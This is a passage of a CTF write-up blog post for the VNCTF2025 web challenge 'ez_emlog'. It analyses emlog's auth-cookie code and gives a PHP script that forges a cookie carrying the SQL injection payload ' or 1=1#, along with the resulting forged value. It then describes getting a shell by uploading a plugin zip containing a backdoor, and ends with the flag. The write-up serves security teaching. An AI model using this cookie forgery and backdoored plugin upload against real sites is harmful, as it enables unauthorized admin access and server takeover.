+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, AUTH_KEY);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAuthCookie</span>(<span class="params"><span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$cookie</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$cookie_elements</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$cookie_elements</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$expiration</span>, <span class="variable">$hmac</span>) = <span class="variable">$cookie_elements</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$expiration</span>) &amp;&amp; <span class="variable">$expiration</span> &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$hmac</span> !== <span class="variable">$hash</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$user</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserDataByLogin</span>(<span class="variable">$username</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>generateAuthCookie函数，validateAuthCookie函数，emHash函数。generateAuthCookie是生成认证cookie，我们想要伪造cookie登录的话那就要使用到这个generateAuthCookie函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>传参$user_login和$expiration，我们查找用法看一下是啥。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">setAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$persist</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$persist</span>) &#123;</span><br><span class="line">            <span class="variable">$expiration</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">12</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$expiration</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$auth_cookie_name</span> = AUTH_COOKIE_NAME;</span><br><span class="line">        <span class="variable">$auth_cookie</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">generateAuthCookie</span>(<span class="variable">$user_login</span>, <span class="variable">$expiration</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="variable">$auth_cookie_name</span>, <span class="variable">$auth_cookie</span>, <span class="variable">$expiration</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>$expiration几乎不用管了，看$user_login就行，继续查找用法。</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216184650642.png" class="" title="图片引用方法一">
+
+<p>user_login是用户名。那就很简单了，我们知道用户名的话就能伪造cookie实现登录。</p>
+<p>但是没有给出任何用户名。。。</p>
+<p>找了半天，发现！在validateAuthCookie函数中有个getUserDataByLogin的方法，应该是通过用户名获取用户信息的一个方法。</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216184841658.png" class="" title="图片引用方法一">
+
+<p>其中存在sql语句的拼接！一眼sql注入。。</p>
+<p>先来看看validateAuthCookie函数，捋一下</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216185142267.png" class="" title="图片引用方法一">
+
+<p>这个函数接收认证cookie，然后将其拆分为原来的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list($username, $expiration, $hmac) = $cookie_elements;</span><br></pre></td></tr></table></figure>
+
+<p>因此，sql注入直接万能密码就能进入了！</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">    <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, <span class="string">&#x27;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">generateAuthCookie</span>(<span class="string">&quot;&#x27; or 1=1#&quot;</span>,<span class="number">0</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1#|0|71f4f3bbe056e7791debdc858b458a7c</span><br></pre></td></tr></table></figure>
+
+<p>然后对validateAuthCookie函数查找一下用法，看看怎么将伪造的cookie传入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAuthCookie</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[AUTH_COOKIE_NAME])) &#123;</span><br><span class="line">        <span class="title class_">Output</span>::<span class="title function_ invoke__">authError</span>(<span class="string">&#x27;auth cookie error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$userInfo</span> = loginauth::<span class="title function_ invoke__">validateAuthCookie</span>(<span class="variable">$_COOKIE</span>[AUTH_COOKIE_NAME]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$userInfo</span>) &#123;</span><br><span class="line">        <span class="title class_">Output</span>::<span class="title function_ invoke__">authError</span>(<span class="string">&#x27;auth cookie error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;curUserInfo = <span class="variable">$userInfo</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;curUid = (<span class="keyword">int</span>)<span class="variable">$userInfo</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216190820178.png" class="" title="图片引用方法一">
+
+<p>直接进到后台！耶耶耶！！！</p>
+<p>查一下后台漏洞吧。。。本以为会直接给flag</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/W13680336969/article/details/137267677">https://blog.csdn.net/W13680336969/article/details/137267677</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yangliukk/emlog/blob/main/Plugin-getshell.md">https://github.com/yangliukk/emlog/blob/main/Plugin-getshell.md</a></p>
+<p>接下来跟着文章走一下</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216191127008.png" class="" title="图片引用方法一">
+
+<p>在网上找一个插件压缩包，构建如下格式，往里面塞一个后门即可。（这里我直接把插件中的postchat.php文件内容改成了后门）</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216194011009.png" class="" title="图片引用方法一">
+
+<p>但是我们不知道上传的目录</p>
+<p>看一下plugin.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;upload_zip&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_UPLOAD_FORBID&#x27;</span>) &amp;&amp; APP_UPLOAD_FORBID === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emMsg</span>(<span class="string">&#x27;系统禁止上传安装应用&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">LoginAuth</span>::<span class="title function_ invoke__">checkToken</span>();</span><br><span class="line">    <span class="variable">$zipfile</span> = <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pluzip&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;pluzip&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_d=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_g=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zipfile</span> || <span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] &gt;= <span class="number">1</span> || <span class="keyword">empty</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emMsg</span>(<span class="string">&#x27;插件上传失败， 错误码：&#x27;</span> . <span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">getFileSuffix</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;name&#x27;</span>]) != <span class="string">&#x27;zip&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_f=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="title function_ invoke__">emUnZip</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;../content/plugins/&#x27;</span>, <span class="string">&#x27;plugin&#x27;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$ret</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?activate_install=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_e=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_b=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_c=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点在此处：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ret = emUnZip($zipfile[&#x27;tmp_name&#x27;], &#x27;../content/plugins/&#x27;, &#x27;plugin&#x27;);</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216194234363.png" class="" title="图片引用方法一">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;8ceee0ba-f6e3-f38f-903c-4f96cab7d6b5&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About me</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6"><span class="toc-number">1.</span> <span class="toc-text">奶龙回家</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">学生姓名登记系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gin"><span class="toc-number">3.</span> <span class="toc-text">Gin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-emlog"><span class="toc-number">4.</span> <span class="toc-text">ez_emlog</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&text=VNCTF2025-Web-wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&is_video=false&description=VNCTF2025-Web-wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VNCTF2025-Web-wp&body=Check out this article: http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&name=VNCTF2025-Web-wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&t=VNCTF2025-Web-wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    Meteor_Kai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+	  <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'Meteor_Kai';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
